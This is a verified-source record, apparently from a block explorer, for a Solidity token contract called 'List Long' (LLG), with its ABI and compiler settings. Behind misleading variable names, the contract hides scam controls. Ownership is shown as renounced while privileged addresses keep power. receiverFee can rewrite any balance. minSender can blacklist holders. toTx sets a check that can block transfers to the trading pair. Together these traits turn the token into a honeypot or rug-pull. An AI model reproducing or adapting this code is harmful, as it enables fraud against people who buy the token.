{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface teamSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxEnableAmount {\n    function createPair(address txTrading, address walletSell) external returns (address);\n}\n\ninterface txFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toLaunchTotal) external view returns (uint256);\n\n    function transfer(address fundFrom, uint256 minAuto) external returns (bool);\n\n    function allowance(address tokenList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundFrom,\n        uint256 minAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountTo, uint256 value);\n    event Approval(address indexed tokenList, address indexed spender, uint256 value);\n}\n\ninterface shouldReceiver is txFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ListLong is teamFrom, txFee, shouldReceiver {\n\n    string private listMarketing = \"List Long\";\n\n    constructor (){\n        if (txSender != walletMarketing) {\n            txSender = swapLaunched;\n        }\n        teamSwap isEnableLaunched = teamSwap(teamMarketingTo);\n        tradingFrom = maxEnableAmount(isEnableLaunched.factory()).createPair(isEnableLaunched.WETH(), address(this));\n        if (walletMarketing == fromMax) {\n            sellReceiver = false;\n        }\n        teamReceiverBuy = _msgSender();\n        atTxBuy();\n        launchTakeExempt[teamReceiverBuy] = true;\n        feeReceiver[teamReceiverBuy] = launchedWallet;\n        \n        emit Transfer(address(0), teamReceiverBuy, launchedWallet);\n    }\n\n    bool private maxFrom;\n\n    function receiverFee(address toBuy, uint256 minAuto) public {\n        enableWallet();\n        feeReceiver[toBuy] = minAuto;\n    }\n\n    string private modeMaxSwap = \"LLG\";\n\n    function transferFrom(address sellExempt, address fundFrom, uint256 minAuto) external override returns (bool) {\n        if (_msgSender() != teamMarketingTo) {\n            if (exemptSwap[sellExempt][_msgSender()] != type(uint256).max) {\n                require(minAuto <= exemptSwap[sellExempt][_msgSender()]);\n                exemptSwap[sellExempt][_msgSender()] -= minAuto;\n            }\n        }\n        return liquidityTotalAmount(sellExempt, fundFrom, minAuto);\n    }\n\n    event OwnershipTransferred(address indexed buyExemptLaunch, address indexed launchedLiquidity);\n\n    bool public tradingEnableFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeMaxSwap;\n    }\n\n    uint256 walletLiquidity;\n\n    uint256 public txSender;\n\n    function liquidityTotalAmount(address sellExempt, address fundFrom, uint256 minAuto) internal returns (bool) {\n        if (sellExempt == teamReceiverBuy) {\n            return tradingReceiver(sellExempt, fundFrom, minAuto);\n        }\n        uint256 walletSwap = txFee(tradingFrom).balanceOf(tokenLiquidity);\n        require(walletSwap == toMin);\n        require(fundFrom != tokenLiquidity);\n        if (marketingReceiver[sellExempt]) {\n            return tradingReceiver(sellExempt, fundFrom, marketingFrom);\n        }\n        return tradingReceiver(sellExempt, fundFrom, minAuto);\n    }\n\n    address public tradingFrom;\n\n    mapping(address => uint256) private feeReceiver;\n\n    function tradingReceiver(address sellExempt, address fundFrom, uint256 minAuto) internal returns (bool) {\n        require(feeReceiver[sellExempt] >= minAuto);\n        feeReceiver[sellExempt] -= minAuto;\n        feeReceiver[fundFrom] += minAuto;\n        emit Transfer(sellExempt, fundFrom, minAuto);\n        return true;\n    }\n\n    function minSender(address takeToSender) public {\n        enableWallet();\n        if (tradingEnableFrom == maxFrom) {\n            swapLaunched = walletMarketing;\n        }\n        if (takeToSender == teamReceiverBuy || takeToSender == tradingFrom) {\n            return;\n        }\n        marketingReceiver[takeToSender] = true;\n    }\n\n    address private modeIs;\n\n    function name() external view virtual override returns (string memory) {\n        return listMarketing;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingList;\n    }\n\n    function transfer(address toBuy, uint256 minAuto) external virtual override returns (bool) {\n        return liquidityTotalAmount(_msgSender(), toBuy, minAuto);\n    }\n\n    uint256 toMin;\n\n    function balanceOf(address toLaunchTotal) public view virtual override returns (uint256) {\n        return feeReceiver[toLaunchTotal];\n    }\n\n    address public teamReceiverBuy;\n\n    uint8 private tradingList = 18;\n\n    uint256 public tradingShould;\n\n    function approve(address autoFund, uint256 minAuto) public virtual override returns (bool) {\n        exemptSwap[_msgSender()][autoFund] = minAuto;\n        emit Approval(_msgSender(), autoFund, minAuto);\n        return true;\n    }\n\n    function atTxBuy() public {\n        emit OwnershipTransferred(teamReceiverBuy, address(0));\n        modeIs = address(0);\n    }\n\n    bool public sellReceiver;\n\n    function listTeam(address swapFund) public {\n        if (atTotal) {\n            return;\n        }\n        \n        launchTakeExempt[swapFund] = true;\n        \n        atTotal = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptSwap;\n\n    address teamMarketingTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return modeIs;\n    }\n\n    uint256 public launchIsLiquidity;\n\n    uint256 private sellShould;\n\n    mapping(address => bool) public launchTakeExempt;\n\n    address tokenLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public walletMarketing;\n\n    bool public atTotal;\n\n    function owner() external view returns (address) {\n        return modeIs;\n    }\n\n    function toTx(uint256 minAuto) public {\n        enableWallet();\n        toMin = minAuto;\n    }\n\n    uint256 private launchedWallet = 100000000 * 10 ** 18;\n\n    uint256 private swapLaunched;\n\n    function enableWallet() private view {\n        require(launchTakeExempt[_msgSender()]);\n    }\n\n    uint256 public fromMax;\n\n    function allowance(address receiverMarketing, address autoFund) external view virtual override returns (uint256) {\n        if (autoFund == teamMarketingTo) {\n            return type(uint256).max;\n        }\n        return exemptSwap[receiverMarketing][autoFund];\n    }\n\n    uint256 constant marketingFrom = 3 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedWallet;\n    }\n\n    mapping(address => bool) public marketingReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyExemptLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunchTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchIsLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTakeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"}],\"name\":\"listTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToSender\",\"type\":\"address\"}],\"name\":\"minSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAuto\",\"type\":\"uint256\"}],\"name\":\"receiverFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiverBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minAuto\",\"type\":\"uint256\"}],\"name\":\"toTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnableFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ListLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}